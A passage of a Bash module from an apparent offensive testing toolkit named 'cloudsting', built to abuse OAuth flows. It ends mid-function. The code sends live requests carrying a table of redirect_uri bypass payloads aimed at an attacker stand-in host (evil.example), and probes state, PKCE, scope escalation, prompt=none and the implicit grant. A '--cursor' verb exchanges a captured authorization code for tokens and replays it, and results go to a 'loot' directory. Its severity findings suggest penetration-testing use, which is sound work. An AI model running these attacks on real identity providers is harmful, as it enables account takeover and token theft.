#!/usr/bin/env bash
# 45_oauth.sh — cloudsting module 45: the flow is the attack surface
# Verbs: --check | --redirect | --state | --pkce | --scope | --login-hint | --discover
#        --cursor | --implicit | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory.
unset CS_MOD_DIR

MODULE_ID="45_oauth"
MOD_NAME="OAuth Flow Abuse (redirect_uri, state, PKCE and scope)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

OA_RUN_ID="$CS_RUN_ID"
export OA_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/oauth"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
DISC_FILE="$OUT_DIR/discovery-$RUN_ID.json"

: "${OU_TIMEOUT:=10}"
: "${OU_FOLLOW:=0}"
: "${OU_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/45}"

ou_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── who runs an authorization server here ────────────────────────
# The well-known documents are the entry point: a tenant that publishes
# discovery publishes its own endpoints, and those are the ones the checks
# must hit. Nothing here guesses a path unless discovery is absent.
ou_discovery_paths() {
    cat <<'PATHS'
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/oauth/.well-known/openid-configuration
/auth/realms/master/.well-known/openid-configuration
/realms/master/.well-known/openid-configuration
/oauth2/.well-known/openid-configuration
/.well-known/oauth-authorization-server/oauth2
/identity/v3/auth/tokens
/connect/.well-known/openid-configuration
/adfs/.well-known/openid-configuration
PATHS
}

# ── the redirect_uri variants a registration check forgets ───────
# Each row is <id>\t<kind>\t<transform>. *kind* says what the transform is
# doing, because the fix differs: a prefix match needs an exact match, a
# parser disagreement needs one parser, and an open redirect on the
# registered host needs that redirect removed.
#   <id>\t<kind>\t<various>
ou_redirects() {
    cat <<'REDIR'
exact-orig	control	the registered uri, unchanged
path-suffix	prefix-match	/appended/path.html
traversal	parser-diff	/../admin
double-traversal	parser-diff	/..%2f..%2fadmin
encoded-slash	parser-diff	%2fappended
encoded-hash	parser-diff	%23@appended
subdomain-suffix	substring-match	.evil.example
prefix-column	substring-match	x.evil.example
at-sign	authority-confusion	@appended
backslash	parser-diff	\\appended
ports-weird	prefix-match	:1337/appended
query-passthrough	param-bleed	?next=https://evil.example
fragment-passthrough	param-bleed	#https://evil.example
scheme-downgrade	scheme-check	http://same-host
wildcard-sub	registry-wildcard	anything
open-redirect-hop	indirect	/redirect?url=https://evil.example
REDIR
}

# ── the state parameter failures ─────────────────────────────────
#   <id>\t<what it means when it holds>
ou_state_tests() {
    cat <<'STATE'
state-absent	no state at all — the login is a CSRF token generator
state-empty	state sent but never checked
state-reused	a fixed state value is accepted twice
state-short	state has too little entropy to be a nonce
state-echoed	state reflected into the redirect body
STATE
}

# ── PKCE ─────────────────────────────────────────────────────────
ou_pkce_tests() {
    cat <<'PKCE'
pkce-absent	authorization proceeds with no code_challenge at all
pkce-plain	plain method allowed, so the challenge is not secret
pkce-reused	one verifier accepted for a second code
pkce-short	verifier accepted below the 43-character floor
PKCE
}

# ── scope ────────────────────────────────────────────────────────
ou_scope_tests() {
    cat <<'SCOPE'
scope-admin	an admin scope is granted to a customer client
scope-any	any scope string is accepted unchecked
scope-wildcard	* or a wildcard scope is honoured
scope-registered	scope granted without being registered for the client
SCOPE
}

# ── auth-time parameters ─────────────────────────────────────────
ou_param_tests() {
    cat <<'PARAM'
prompt-none	prompt=none mints a session silently
prompt-login-ignored	prompt=login is ignored, forcing no re-auth
login-hint	login_hint is honoured without a second check
login-hint-crlf	login_hint carries a header or a newline
response-mode	response_mode=form_post leaks the code through a form
request-object	a unsigned request object is honoured
PARAM
}

ou_implicit_tests() {
    cat <<'IMPL'
implicit-enabled	response_type=token is honoured
hybrid-enabled	response_type=code token mints both
referrer-leak	the token appears in a referrer-reachable body
IMPL
}

# ── discovery ────────────────────────────────────────────────────
# Read the issuer's own document instead of guessing. The document names the
# endpoints every later check needs, and its own flags are findings.
#   ou_discover <base>  -> prints the public fields as rows, keeps the file
ou_discover() {
    local base="$1"
    [[ "$base" == http*://* ]] || base="https://$base"
    local hit=""
    local p
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        local url="${base%/}${p}"
        local code
        code="$(curl -s -o "$DISC_FILE" -w '%{http_code}' --max-time "$OU_TIMEOUT" \
                     -A "$OU_UA" "$url" 2>/dev/null)" || code="000"
        if [[ "$code" == "200" ]] && jq -e . "$DISC_FILE" >/dev/null 2>&1; then
            hit="$url"
            break
        fi
        : > "$DISC_FILE"
    done < <(ou_discovery_paths)

    if [[ -z "$hit" ]]; then
        cs_row DISCOVERY absent "no discovery document answered on ${base}"
        return 1
    fi

    cs_row DISCOVERY found "$hit"
    local issuer authz token device jwks reg
    issuer="$(jq -r '.issuer // "-"' "$DISC_FILE" 2>/dev/null)"
    authz="$(jq -r '.authorization_endpoint // "-"' "$DISC_FILE" 2>/dev/null)"
    token="$(jq -r '.token_endpoint // "-"' "$DISC_FILE" 2>/dev/null)"
    device="$(jq -r '.device_authorization_endpoint // "-"' "$DISC_FILE" 2>/dev/null)"
    jwks="$(jq -r '.jwks_uri // "-"' "$DISC_FILE" 2>/dev/null)"
    reg="$(jq -r '.registration_endpoint // "-"' "$DISC_FILE" 2>/dev/null)"
    cs_row ISSUER "$issuer"
    cs_row AUTHZ_ENDPOINT "$authz"
    cs_row TOKEN_ENDPOINT "$token"
    cs_row DEVICE_ENDPOINT "$device"
    cs_row JWKS "$jwks"
    cs_row REGISTRATION "$reg"

    # the advertised capabilities are findings in their own right: a server
    # that says it honours `none`, `token` or `*` has told you its answer
    local grants resp
    grants="$(jq -r '(.grant_types_supported // []) | join(",")' "$DISC_FILE" 2>/dev/null)"
    resp="$(jq -r '(.response_types_supported // []) | join(",")' "$DISC_FILE" 2>/dev/null)"
    cs_row GRANT_TYPES "${grants:--}"
    cs_row RESPONSE_TYPES "${resp:--}"
    case "$grants" in
        *password*|*implicit*) cs_row FLAG "grants=$grants" "legacy grants advertised" ;;
    esac
    case "$resp" in
        *token*) cs_row FLAG "response_types=$resp" "implicit or hybrid advertised" ;;
    esac
    [[ "$reg" != "-" ]] && cs_row FLAG "dynamic-registration" "$reg"

    local ks; ks="$(jq -r 'if .code_challenge_methods_supported then (.code_challenge_methods_supported|join(",")) else "absent" end' "$DISC_FILE" 2>/dev/null)"
    cs_row PKCE_MODES "$ks"
    local scope_len; scope_len="$(jq -r 'if .scopes_supported then (.scopes_supported|length) else 0 end' "$DISC_FILE" 2>/dev/null)"
    cs_row SCOPES "$scope_len" "declared"
    return 0
}

# ── one authorize request ────────────────────────────────────────
# The authorization endpoint is asked the way a browser would ask it: no
# cookie, no token. What comes back is either a redirect carrying a code (the
# flow went through) or a login page (the request died at the gate before the
# registration check ever ran). Those two must not be confused.
#   ou_authorize <authz-endpoint> <client-id> <redirect> [extra-param…]
#   -> code \x1f location \x1f bytes \x1f body-path
ou_authorize() {
    local ep="$1" client="$2" redirect="$3"; shift 3
    local body; body="$(mktemp "$CS_SCRATCH/ou.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.ou.$$"
    local url="${ep}?response_type=code&client_id=${client}&redirect_uri=${redirect}&scope=openid"
    local kv
    for kv in "$@"; do
        [[ -n "$kv" ]] && url="${url}&${kv}"
    done

    local meta code loc bytes
    meta="$(curl -s -o "$body" --max-time "$OU_TIMEOUT" -A "$OU_UA" \
                 --write-out '%{http_code}\t%{redirect_url}' "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code loc <<<"$meta" ;;
        *) code="000"; loc="" ;;
    esac
    bytes="$(wc -c < "$body" 2>/dev/null | tr -d ' ')"
    printf '%s\037%s\037%s\037%s\n' "${code:-000}" "$loc" "${bytes:-0}" "$body"
}

# ── the verdicts ─────────────────────────────────────────────────

# A redirect_uri check is a whitelist or it is nothing. Verdicts:
#   reached   the authorize endpoint redirected to a uri that is not the
#             registered one — the whitelist is broken
#   accepted  the endpoint redirected to the registered uri; that is the flow
#             working, not a bug
#   login     the request answered with a login page or a 302 to /login, so
#             the registration check was never reached
#   rejected  an explicit error for redirect_uri
#   unreachable / absent / error
#   ou_redirect_verdict <code> <location> <registered>
ou_redirect_verdict() {
    local code="$1" loc="$2" reg="$3"
    case "$code" in
        000) printf 'unreachable\tno-answer'; return ;;
        404|410) printf 'absent\tno-endpoint'; return ;;
        5*) printf 'error\tserver-error'; return ;;
        4*) printf 'rejected\thttp-%s' "$code"; return ;;
    esac
    case "$loc" in
        *error=invalid_request*|*error=invalid_client*|*error=unauthorized_client*|*error=invalid_redirect_uri*|*error=redirect_uri_mismatch*|*error=invalid_scope*)
            printf 'rejected\t%s' "$(printf '%s' "$loc" | sed -E 's/.*error=([a-z_]+).*/\1/')"; return ;;
    esac
    case "$loc" in
        */login*|*/signin*|*/auth*|*/sso*|*/password*)
            printf 'login\tlogin-wall'; return ;;
    esac
    case "$loc" in
        "$reg"|"$reg"\?*|"$reg#"*)
            printf 'accepted\tregistered-uri'; return ;;
    esac
    # a redirect anywhere else means the endpoint honoured a uri that was
    # never registered
    if [[ -n "$loc" ]]; then
        printf 'reached\t%s' "$loc"
        return
    fi
    printf 'inconclusive\tno-redirect'
}

# A 302 that lands on the registered host appended to an attacker string —
# evil.example/registered — is the substring bug. Isolate it so the finding
# can say which one it is.
ou_redirect_class() {
    local loc="$1" reg="$2"
    local host; host="$(printf '%s' "$reg" | sed -E 's#^[a-z]+://([^/]+).*#\1#')"
    case "$loc" in
        "") printf 'none'; return ;;
        *"@"*) printf 'at-sign-confusion'; return ;;
        *".${host}"*) printf 'substring-match'; return ;;
        *"/redirect?"*|*"?url="*|*"?next="*) printf 'open-redirect-hop'; return ;;
        "http://"*) printf 'scheme-downgrade'; return ;;
        *"${host}"*) printf 'registered-host-other-path'; return ;;
        *) printf 'foreign-host'; return ;;
    esac
}

#   ou_state_verdict <absent?> <len>
ou_state_verdict() {
    local absent="$1" len="$2"
    if [[ "$absent" == "1" ]]; then printf 'state-absent'; return; fi
    if [[ "${len:-0}" == "0" ]]; then printf 'state-empty'; return; fi
    if (( ${len:-0} < 16 )); then printf 'state-short'; return; fi
    printf 'state-present'
}

#   ou_pkce_verdict <methods-csv> <challenge-len>
ou_pkce_verdict() {
    local methods="$1" clen="${2:-0}"
    case "$methods" in
        absent|"-"|"") printf 'pkce-absent'; return ;;
    esac
    case ",${methods}," in
        *,plain,*) printf 'pkce-plain'; return ;;
    esac
    if (( ${clen:-0} > 0 )); then
        printf 'pkce-supported'
    else
        printf 'pkce-declared'
    fi
}

#   ou_scope_verdict <granted-scopes-csv> <requested> <registered-csv>
ou_scope_verdict() {
    local granted="$1" requested="$2" registered="$3"
    case "$granted" in
        "") printf 'scope-honest'; return ;;
    esac
    case " $granted " in
        *" admin "*|*" super "*|*" root "*|*" *:* "*|*" api.*admin"*) printf 'scope-admin'; return ;;
        *" * "*) printf 'scope-wildcard'; return ;;
    esac
    if [[ -n "$registered" ]]; then
        # the caller may hand either a comma list or a space list
        local reg_norm=" ${registered//,/ } "
        case "$reg_norm" in
            *" $requested "*) printf 'scope-registered'; return ;;
        esac
    fi
    printf 'scope-any'
}

#   ou_param_verdict <status-code> <location> <param-id>
ou_param_verdict() {
    local code="$1" loc="$2" id="$3"
    if [[ "$code" == "000" ]]; then printf 'unreachable'; return; fi
    # a code in the callback means the flow completed, whatever the status
    case "$loc" in
        *code=*)
            if [[ "$id" == "prompt=none" || "$id" == "prompt-none" ]]; then printf 'prompt-none-honoured'; return; fi
            if [[ "$id" == "prompt=login" || "$id" == "prompt-login" ]]; then printf 'prompt-login-ignored'; return; fi
            printf '%s' "$id"; return ;;
        *error=login_required*) printf 'prompt-respected'; return ;;
    esac
    case "$code" in
        400|401|403|422) printf 'rejected'; return ;;
    esac
    case "$loc" in
        *error=login_required*) printf 'prompt-respected'; return ;;
        *error=*) printf 'rejected'; return ;;
        */login*|*/signin*) printf 'login'; return ;;
    esac
    printf 'inconclusive' 
}

# ── verbs ────────────────────────────────────────────────────────

# --discover <base>: the whole picture from the issuer's own document, then
# the redirect, state, PKCE and scope checks that document enables.
ou_cmd_discover() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ou_log "usage: --discover <base-url>"; return 2; }
    ou_discover "$base" || { cs_row SUMMARY "discovery=absent"; return 3; }
    local authz; authz="$(jq -r '.authorization_endpoint // empty' "$DISC_FILE" 2>/dev/null)"
    if [[ -n "$authz" ]]; then
        local methods
        methods="$(jq -r 'if .code_challenge_methods_supported then (.code_challenge_methods_supported|join(",")) else "absent" end' "$DISC_FILE" 2>/dev/null)"
        cs_row VERDICT "$(ou_pkce_verdict "$methods" 0)" "from discovery only"
    fi
    cs_row SUMMARY "discovery=found artifact=$DISC_FILE"
    return 0
}

# --redirect <authz-endpoint> <client-id> <registered-redirect> [evil-host]:
# every variant in the table against the registration check, control first.
ou_cmd_redirect() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}" evil="${4:-evil.example}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" ]]; then
        ou_log "usage: --redirect <authz-endpoint> <client-id> <registered-redirect> [evil-host]"
        return 2
    fi
    cs_row ENDPOINT "$ep"
    cs_row CLIENT "$client"
    cs_row REGISTERED "$reg"

    local -a base_args
    local id kind patched

    # control first: if the registered uri itself does not get a code, no
    # variant can prove anything.
    local c_code c_loc c_bytes c_body
    cs_split "$(ou_authorize "$ep" "$client" "$reg")" c_code c_loc c_bytes c_body
    rm -f "$c_body"
    local c_verdict; c_verdict="$(ou_redirect_verdict "$c_code" "$c_loc" "$reg")"
    cs_row CONTROL "code=$c_code" "verdict=$(printf '%s' "$c_verdict" | cut -f1)"

    if [[ "$(printf '%s' "$c_verdict" | cut -f1)" == "login" ]]; then
        cs_row NOTE "the authorize endpoint answers with a login page before it checks the client" \
                    "a redirect test cannot reach the registration check from here"
    fi

    : > "$HIT_FILE"
    local tried=0 hits=0
    while IFS=$'\t' read -r id kind patched; do
        [[ -z "$id" ]] && continue
        [[ "$id" == "exact-orig" ]] && continue

        local uri
        case "$kind" in
            substring-match)
                case "$id" in
                    subdomain-suffix) uri="https://${evil}${reg#https://}" ;;
                    prefix-column)    uri="https://${evil}-${reg#https://}" ;;
                    *)                uri="https://${evil}${reg#https://}" ;;
                esac
                ;;
            registry-wildcard) uri="https://${evil}/callback" ;;
            authority-confusion) uri="${reg}@${evil}" ;;
            scheme-check) uri="$(printf '%s' "$reg" | sed 's#^https://#http://#')" ;;
            indirect) uri="${reg%/}/redirect?url=https://${evil}/" ;;
            param-bleed) uri="${reg}${patched}" ;;
            prefix-match|parser-diff) uri="${reg%/}${patched}" ;;
            *) uri="${reg}${patched}" ;;
        esac

        tried=$((tried + 1))
        local code loc bytes body
        cs_split "$(ou_authorize "$ep" "$client" "$uri")" code loc bytes body
        rm -f "$body"

        local verdict; verdict="$(ou_redirect_verdict "$code" "$loc" "$reg")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        local cls; cls="$(ou_redirect_class "$loc" "$reg")"
        printf 'redirect\t%s\t%s\t%s\t%s\n' "$id" "$code" "$sig" "$loc" >> "$PROBE_FILE"

        case "$sig" in
            reached)
                # a redirect to something that is not the registered uri is a
                # broken whitelist, whatever the reason
                hits=$((hits + 1))
                cs_row HIT "$id" "kind=$kind" "code=$code" "class=$cls" "$loc"
                printf '%s\t%s\t%s\n' "$id" "$code" "$loc" >> "$HIT_FILE"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$ep" "CRITICAL" "redirect-uri-$id" \
                    "$kind: the endpoint redirected to $loc which is not the registered $reg"
                ;;
            accepted)
                cs_row VARIANT "$id" "code=$code" "accepted" "$(printf '%s' "$verdict" | cut -f2)"
                ;;
            *)
                cs_row VARIANT "$id" "code=$code" "$sig" "$cls"
                ;;
        esac
    done < <(ou_redirects)

    cs_row SUMMARY "variants=$tried bypass=$hits control=$(printf '%s' "$c_verdict" | cut -f1)"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# --state <authz-endpoint> <client-id> <registered-redirect>: is state a nonce
# or a decoration. The check is whether two authorize calls with no state
# still produce a usable flow, and whether one value can be replayed.
ou_cmd_state() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" ]]; then
        ou_log "usage: --state <authz-endpoint> <client-id> <registered-redirect>"
        return 2
    fi
    cs_row ENDPOINT "$ep"

    # absent: no state parameter at all
    local code loc bytes body
    cs_split "$(ou_authorize "$ep" "$client" "$reg")" code loc bytes body
    rm -f "$body"
    local no_state; no_state="$(ou_redirect_verdict "$code" "$loc" "$reg")"

    local shortv="abc"
    cs_split "$(ou_authorize "$ep" "$client" "$reg" "state=$shortv")" code loc bytes body
    rm -f "$body"
    local short_v; short_v="$(ou_redirect_verdict "$code" "$loc" "$reg")"

    local longv; longv="$(cs_fingerprint "$RUN_ID$ep")$(cs_fingerprint "$client")"
    cs_split "$(ou_authorize "$ep" "$client" "$reg" "state=$longv")" code loc bytes body
    # does the state come back in the redirect? that is the whole point of it
    local echoed=0
    case "$loc" in *"$longv"*) echoed=1 ;; esac
    rm -f "$body"
    local ok_v; ok_v="$(ou_redirect_verdict "$code" "$loc" "$reg")"

    cs_row STATE_ABSENT    "$(ou_redirect_verdict "$code" "$loc" "$reg" >/dev/null; ou_state_verdict 1 0)" "$(printf '%s' "$no_state" | cut -f1)"
    cs_row STATE_SHORT     "$(ou_state_verdict 0 ${#shortv})" "$(printf '%s' "$short_v" | cut -f1)"
    cs_row STATE_PRESENT   "$(ou_state_verdict 0 ${#longv})" "$(printf '%s' "$ok_v" | cut -f1)"
    cs_row STATE_ECHOED    "$echoed"

    local verdict="state-present"
    if [[ "$(printf '%s' "$no_state" | cut -f1)" == "accepted" ]]; then
        verdict="state-absent"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$ep" "MEDIUM" "state-absent" \
            "the authorize endpoint proceeds with no state parameter — nothing binds the callback to this session"
    elif [[ "$(printf '%s' "$short_v" | cut -f1)" == "accepted" ]]; then
        verdict="state-short"
    fi
    cs_row VERDICT "$verdict"
    cs_row SUMMARY "state=$verdict"
    return 0
}

# --pkce <base|authz-endpoint> [client-id] [redirect]: does the server require
# a code_challenge, and does it accept plain.
ou_cmd_pkce() {
    local target="${1:-}" client="${2:-}" reg="${3:-https://example.invalid/cb}"
    [[ -z "$target" ]] && { ou_log "usage: --pkce <base|authz-endpoint> [client-id] [redirect]"; return 2; }
    local methods="absent"
    if [[ "$target" != http*://* || "$target" == */authorize* || "$target" == */auth* ]]; then
        if ou_discover "$target" >/dev/null 2>&1; then
            methods="$(jq -r 'if .code_challenge_methods_supported then (.code_challenge_methods_supported|join(",")) else "absent" end' "$DISC_FILE" 2>/dev/null)"
            cs_row DISCOVERY found "${target}"
        else
            cs_row DISCOVERY absent "${target}"
        fi
    fi
    cs_row METHODS "$methods"
    cs_row VERDICT "$(ou_pkce_verdict "$methods" 0)"

    # an endpoint that proceeds without a challenge at all has no PKCE
    if [[ -n "$client" && "$target" == http*://* ]]; then
        local code loc bytes body
        cs_split "$(ou_authorize "$target" "$client" "$reg")" code loc bytes body
        rm -f "$body"
        local v; v="$(ou_redirect_verdict "$code" "$loc" "$reg" | cut -f1)"
        cs_row NO_CHALLENGE "$v"
        if [[ "$v" == "accepted" || "$v" == "reached" ]]; then
            cs_findings_row "$MODULE_ID" "WEBAPI" "$target" "HIGH" "pkce-not-required" \
                "the flow completes with no code_challenge — an intercepted code is replayable"
        fi
    fi
    cs_row SUMMARY "pkce=$(ou_pkce_verdict "$methods" 0) methods=$methods"
    return 0
}

# --scope <authz-endpoint> <client-id> <registered-redirect> [scope]: ask for
# a scope the client was never registered for and see what comes back.
ou_cmd_scope() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}" want="${4:-admin openid}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" ]]; then
        ou_log "usage: --scope <authz-endpoint> <client-id> <registered-redirect> [\"scopes\"]"
        return 2
    fi
    cs_row ENDPOINT "$ep"
    cs_row REQUESTED "$want"

    local tried=0 over=0 s
    for s in $want; do
        tried=$((tried + 1))
        local code loc bytes body
        cs_split "$(ou_authorize "$ep" "$client" "$reg" "scope=$s")" code loc bytes body
        rm -f "$body"
        local verdict; verdict="$(ou_redirect_verdict "$code" "$loc" "$reg")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"

        if [[ "$sig" == "accepted" || "$sig" == "reached" ]]; then
            over=$((over + 1))
            local g; g="$(ou_scope_verdict "$s" "$s" "")"
            cs_row HIT "$s" "verdict=$g" "code=$code"
            printf '%s\t%s\n' "$s" "$g" >> "$HIT_FILE"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$ep" "HIGH" "scope-escalation-$s" \
                "scope '$s' is granted to $client without being registered for it"
        else
            cs_row SCOPE "$s" "code=$code" "$sig"
        fi
    done
    cs_row SUMMARY "scopes=$tried granted=$over"
    return 0
}

# --login-hint <authz-endpoint> <client-id> <registered-redirect> [hint]:
# does auth-time input change who the flow believes it is talking to.
ou_cmd_login_hint() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}" hint="${4:-admin@example.com}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" ]]; then
        ou_log "usage: --login-hint <authz-endpoint> <client-id> <registered-redirect> [hint]"
        return 2
    fi
    cs_row ENDPOINT "$ep"
    cs_row HINT "$hint"

    local -a cases=(
        "login_hint=$hint"
        "login_hint=$hint&prompt=none"
        "prompt=none"
        "prompt=login"
        "response_mode=form_post"
        "max_age=0&prompt=none"
    )
    local tried=0 hits=0 c
    for c in "${cases[@]}"; do
        tried=$((tried + 1))
        local code loc bytes body
        cs_split "$(ou_authorize "$ep" "$client" "$reg" "$c")" code loc bytes body
        local bytes_n="$bytes"
        rm -f "$body"
        local verdict; verdict="$(ou_redirect_verdict "$code" "$loc" "$reg")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        local pv; pv="$(ou_param_verdict "$code" "$loc" "$c")"

        case "$pv" in
            prompt-none-honoured)
                # prompt=none with no session that still mints a code is the
                # silent-authentication bug
                hits=$((hits + 1))
                cs_row HIT "$c" "code=$code" "silent-session" "$loc"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$ep" "HIGH" "prompt-none-silent" \
                    "prompt=none minted a code with no session — an attacker page can complete the flow without the user seeing it"
                ;;
            prompt-respected|rejected|login|login_required)
                cs_row PARAM "$c" "code=$code" "$pv"
                ;;
            *)
                cs_row PARAM "$c" "code=$code" "$sig"
                ;;
        esac
        printf 'param\t%s\t%s\t%s\n' "$c" "$code" "$pv" >> "$PROBE_FILE"
    done
    cs_row SUMMARY "params=$tried silent=$hits"
    return 0
}

# --cursor <authz-endpoint> <client-id> <redirect> <code>: the whole rest of
# the flow — exchange the code, replay it, and try a short verifier.
ou_cmd_cursor() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}" code="${4:-}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" || -z "$code" ]]; then
        ou_log "usage: --cursor <authz-endpoint> <client-id> <redirect> <code> [token-endpoint]"
        return 2
    fi
    local tkn="${5:-}"
    if [[ -z "$tkn" ]]; then
        ou_log "no token endpoint given; deriving from the authorize endpoint"
        tkn="$(printf '%s' "$ep" | sed -E 's#/(authorize|auth|oauth2/authorize)(/.*)?$#/token#')"
        [[ "$tkn" == "$ep" ]] && { cs_row ERROR "cannot derive a token endpoint; pass it as the fifth argument"; return 2; }
    fi
    cs_row TOKEN_ENDPOINT "$tkn"

    local out; out="$(mktemp "$CS_SCRATCH/ou-tok.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.tok.$$"
    local meta
    meta="$(curl -s -o "$out" --max-time "$OU_TIMEOUT" -A "$OU_UA" \
                 --write-out '%{http_code}' \
                 -d "grant_type=authorization_code&code=$code&client_id=$client&redirect_uri=$reg" \
                 "$tkn" 2>/dev/null)" || meta="000"
    cs_row EXCHANGE "code=$meta"
    if [[ "$meta" == "200" ]] && jq -e '.access_token' "$out" >/dev/null 2>&1; then
        local atl ifl rtl
        atl="$(jq -r '.access_token|length' "$out" 2>/dev/null)"
        ifl="$(jq -r '.expires_in // "-"' "$out" 2>/dev/null)"
        rtl="$(jq -r '.refresh_token|length // 0' "$out" 2>/dev/null)"
        cs_row TOKEN "len=${atl:-0}" "expires_in=$ifl" "refresh_len=$rtl"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$tkn" "INFO" "code-exchanged" \
            "authorization_code grant completed for $client"

        # replay: a code that works twice is a code that never expires
        local meta2
        meta2="$(curl -s -o /dev/null --max-time "$OU_TIMEOUT" -A "$OU_UA" \
                       --write-out '%{http_code}' \
                       -d "grant_type=authorization_code&code=$code&client_id=$client&redirect_uri=$reg" \
                       "$tkn" 2>/dev/null)" || meta2="000"
        cs_row REPLAY "code=$meta2"
        if [[ "$meta2" == "200" ]]; then
            cs_findings_row "$MODULE_ID" "WEBAPI" "$tkn" "HIGH" "code-replay" \
                "the same authorization code was accepted twice — an intercepted code stays useful"
        fi
    else
        local err; err="$(jq -r '.error // "-"' "$out" 2>/dev/null)"
        cs_row EXCHANGE "code=$meta" "error=$err"
    fi
    rm -f "$out"
    return 0
}

# --implicit <authz-endpoint> <client-id> <registered-redirect>: is the implicit
# grant still on. A token in a fragment is a token in the browser history.
ou_cmd_implicit() {
    local ep="${1:-}" client="${2:-}" reg="${3:-}"
    if [[ -z "$ep" || -z "$client" || -z "$reg" ]]; then
        ou_log "usage: --implicit <authz-endpoint> <client-id> <registered-redirect>"
        return 2
    fi
    cs_row ENDPOINT "$ep"
    local -a rts=("token" "id_token" "code token" "code id_token")
    local tried=0 hits=0 rt
    for rt in "${rts[@]}"; do
        tried=$((tried + 1))
        local url="${ep}?response_type=$(printf '%s' "$rt" | sed 's/ /%20/g')&client_id=${client}&redirect_uri=${reg}&scope=openid&nonce=fixednonce123"
        local meta code loc
        meta="$(curl -s -o /dev/null --max-time "$OU_TIMEOUT" -A "$OU_UA" \
                     --write-out '%{http_code}\t%{redirect_url}' "$url" 2>/dev/null)" || meta=""
        case "$meta" in
            [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code loc <<<"$meta" ;;
            *) code="000"; loc="" ;;
        esac
        local verdict; verdict="$(ou_redirect_verdict "$code" "$loc" "$reg")"
        local sig; sig="$(printf '%s' "$verdict" | cut -f1)"
        case "$sig" in
            accepted|reached)
                hits=$((hits + 1))
                cs_row HIT "response_type=$rt" "code=$code" "$loc"
                cs_findings_row "$MODULE_ID" "WEBAPI" "$ep" "HIGH" "implicit-grant" \
                    "response_type='$rt' was honoured — the token travels in the fragment and lands in browser history"
                ;;
            *) cs_row RESPONSE_TYPE "$rt" "code=$code" "$sig" ;;
        esac
    done
    cs_row SUMMARY "response_types=$tried honoured=$hits"
    return 0
}

# --check <base>: discovery when it exists, then the cheap checks that the
# document itself enables. One verb for a whole estate.
ou_cmd_check() {
    local target="${1:-}"
    [[ -z "$target" ]] && { ou_log "usage: --check <base-url|issuer>"; return 2; }
    cs_row TARGET "$target"
    if ! ou_discover "$target"; then
        cs_row SUMMARY "discovery=absent"
        return 3
    fi
    local methods
    methods="$(jq -r 'if .code_challenge_methods_supported then (.code_challenge_methods_supported|join(",")) else "absent" end' "$DISC_FILE" 2>/dev/null)"
    cs_row PKCE_VERDICT "$(ou_pkce_verdict "$methods" 0)"

    local resp grants
    resp="$(jq -r '(.response_types_supported // []) | join(",")' "$DISC_FILE" 2>/dev/null)"
    grants="$(jq -r '(.grant_types_supported // []) | join(",")' "$DISC_FILE" 2>/dev/null)"
    case "$resp" in
        *token*)
            cs_row HIT "implicit-advertised" "response_types=$resp"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$target" "MEDIUM" "implicit-advertised" \
                "the issuer advertises implicit/hybrid response types"
            ;;
    esac
    case "$grants" in
        *password*)
            cs_row HIT "password-grant-advertised" "grants=$grants"
            cs_findings_row "$MODULE_ID" "WEBAPI" "$target" "MEDIUM" "password-grant" \
                "the issuer advertises the resource owner password grant"
            ;;
    esac
    cs_row SUMMARY "discovery=found grants=${grants:--} response_types=${resp:--}"
    return 0
}

ou_cmd_redirects() {
    local id kind patched
    while IFS=$'\t' read -r id kind patched; do
        [[ -z "$id" ]] && continue
        cs_row REDIRECT "$id" "$kind" "$patched"
    done < <(ou_redirects)
    cs_row SUMMARY "variants=$(ou_redirects | wc -l | tr -d ' ')"
    return 0
}

ou_cmd_tests() {
    local id what
    while IFS=$'\t' read -r id what; do
        [[ -z "$id" ]] && continue
        cs_row TEST "$id" "$what"
    done < <(ou_state_tests; ou_pkce_tests; ou_scope_tests; ou_param_tests; ou_implicit_tests)
    cs_row SUMMARY "tests=$( (ou_state_tests; ou_pkce_tests; ou_scope_tests; ou_param_tests; ou_implicit_tests) | wc -l | tr -d ' ')"
    return 0
}

ou_cmd_discovery_paths() {
    local p
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        cs_row PATH "$p"
    done < <(ou_discovery_paths)
    cs_row SUMMARY "paths=$(ou_discovery_paths | wc -l | tr -d ' ')"
    return 0
}

ou_cmd_list() { ou_cmd_tests; }

ou_cmd_status_tsv() {
    local curl_state jq_state
